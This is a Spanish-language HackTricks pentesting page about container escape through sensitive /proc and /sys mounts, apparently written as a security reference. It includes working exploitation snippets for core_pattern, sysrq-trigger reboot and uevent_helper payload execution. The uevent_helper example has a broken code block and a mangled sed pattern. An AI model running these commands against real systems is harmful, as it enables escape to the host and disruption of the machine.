# Montajes Sensibles

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

La exposición de `/proc` y `/sys` sin un aislamiento de espacio de nombres adecuado introduce riesgos de seguridad significativos, incluida la ampliación de la superficie de ataque y la divulgación de información. Estos directorios contienen archivos sensibles que, si están mal configurados o son accedidos por un usuario no autorizado, pueden llevar a la fuga del contenedor, modificación del host o proporcionar información que facilite ataques adicionales. Por ejemplo, montar incorrectamente `-v /proc:/host/proc` puede eludir la protección de AppArmor debido a su naturaleza basada en la ruta, dejando `/host/proc` desprotegido.

**Puedes encontrar más detalles de cada vulnerabilidad potencial en** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**

## Vulnerabilidades de procfs

### `/proc/sys`

Este directorio permite el acceso para modificar variables del kernel, generalmente a través de `sysctl(2)`, y contiene varios subdirectorios de interés:

#### **`/proc/sys/kernel/core_pattern`**

* Descrito en [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
* Permite definir un programa para ejecutar en la generación de archivos core con los primeros 128 bytes como argumentos. Esto puede llevar a la ejecución de código si el archivo comienza con un pipe `|`.
*   **Ejemplo de Prueba y Explotación**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Sí # Prueba de acceso de escritura
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Establecer manejador personalizado
sleep 5 && ./crash & # Activar manejador
```

#### **`/proc/sys/kernel/modprobe`**

* Detallado en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Contiene la ruta al cargador de módulos del kernel, invocado para cargar módulos del kernel.
*   **Ejemplo de Verificación de Acceso**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # Verificar acceso a modprobe
```

#### **`/proc/sys/vm/panic_on_oom`**

* Referenciado en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
* Un indicador global que controla si el kernel entra en pánico o invoca al OOM killer cuando ocurre una condición de OOM.

#### **`/proc/sys/fs`**

* Según [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), contiene opciones e información sobre el sistema de archivos.
* El acceso de escritura puede habilitar varios ataques de denegación de servicio contra el host.

#### **`/proc/sys/fs/binfmt_misc`**

* Permite registrar intérpretes para formatos binarios no nativos basados en su número mágico.
* Puede llevar a la escalada de privilegios o acceso a shell de root si `/proc/sys/fs/binfmt_misc/register` es escribible.
* Explicación y explotación relevante:
* [Rootkit de pobre hombre a través de binfmt\_misc](https://github.com/toffan/binfmt\_misc)
* Tutorial detallado: [Enlace al video](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Otros en `/proc`

#### **`/proc/config.gz`**

* Puede revelar la configuración del kernel si `CONFIG_IKCONFIG_PROC` está habilitado.
* Útil para que los atacantes identifiquen vulnerabilidades en el kernel en ejecución.

#### **`/proc/sysrq-trigger`**

* Permite invocar comandos Sysrq, lo que potencialmente puede causar reinicios inmediatos del sistema u otras acciones críticas.
*   **Ejemplo de Reinicio del Host**:

```bash
echo b > /proc/sysrq-trigger # Reinicia el host
```

#### **`/proc/kmsg`**

* Expone mensajes del búfer de anillo del kernel.
* Puede ayudar en exploits del kernel, fugas de direcciones y proporcionar información sensible del sistema.

#### **`/proc/kallsyms`**

* Enumera símbolos exportados del kernel y sus direcciones.
* Esencial para el desarrollo de exploits del kernel, especialmente para superar KASLR.
* La información de direcciones está restringida con `kptr_restrict` establecido en `1` o `2`.
* Detalles en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/[pid]/mem`**

* Interactúa con el dispositivo de memoria del kernel `/dev/mem`.
* Históricamente vulnerable a ataques de escalada de privilegios.
* Más en [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).

#### **`/proc/kcore`**

* Representa la memoria física del sistema en formato core ELF.
* La lectura puede filtrar el contenido de la memoria del host y de otros contenedores.
* Un tamaño de archivo grande puede provocar problemas de lectura o bloqueos de software.
* Uso detallado en [Volcado de /proc/kcore en 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).

#### **`/proc/kmem`**

* Interfaz alternativa para `/dev/kmem`, que representa la memoria virtual del kernel.
* Permite la lectura y escritura, por lo tanto, la modificación directa de la memoria del kernel.

#### **`/proc/mem`**

* Interfaz alternativa para `/dev/mem`, que representa la memoria física.
* Permite la lectura y escritura, la modificación de toda la memoria requiere resolver direcciones virtuales a físicas.

#### **`/proc/sched_debug`**

* Devuelve información de programación de procesos, eludiendo las protecciones del espacio de nombres PID.
* Expone nombres de procesos, IDs e identificadores de cgroup.

#### **`/proc/[pid]/mountinfo`**

* Proporciona información sobre los puntos de montaje en el espacio de nombres de montaje del proceso.
* Expone la ubicación del `rootfs` del contenedor o de la imagen.

### Vulnerabilidades de `/sys`

#### **`/sys/kernel/uevent_helper`**

* Utilizado para manejar `uevents` de dispositivos del kernel.
* Escribir en `/sys/kernel/uevent_helper` puede ejecutar scripts arbitrarios al activar `uevents`.
*   **Ejemplo de Explotación**: %%%bash

### Crea un payload

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

### Encuentra la ruta del host desde el montaje de OverlayFS para el contenedor

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

### Establece uevent\_helper en el helper malicioso

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

### Activa un uevent

echo change > /sys/class/mem/null/uevent

### Lee la salida

cat /output %%%
#### **`/sys/class/thermal`**

* Controla la configuración de temperatura, potencialmente causando ataques de denegación de servicio o daños físicos.

#### **`/sys/kernel/vmcoreinfo`**

* Filtra direcciones del kernel, comprometiendo potencialmente KASLR.

#### **`/sys/kernel/security`**

* Alberga la interfaz `securityfs`, permitiendo la configuración de Módulos de Seguridad de Linux como AppArmor.
* El acceso podría permitir que un contenedor deshabilite su sistema MAC.

#### **`/sys/firmware/efi/vars` y `/sys/firmware/efi/efivars`**

* Expone interfaces para interactuar con variables EFI en la NVRAM.
* La mala configuración o explotación puede llevar a laptops inutilizables o máquinas host no arrancables.

#### **`/sys/kernel/debug`**

* `debugfs` ofrece una interfaz de depuración "sin reglas" al kernel.
* Historial de problemas de seguridad debido a su naturaleza no restringida.

### Referencias

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
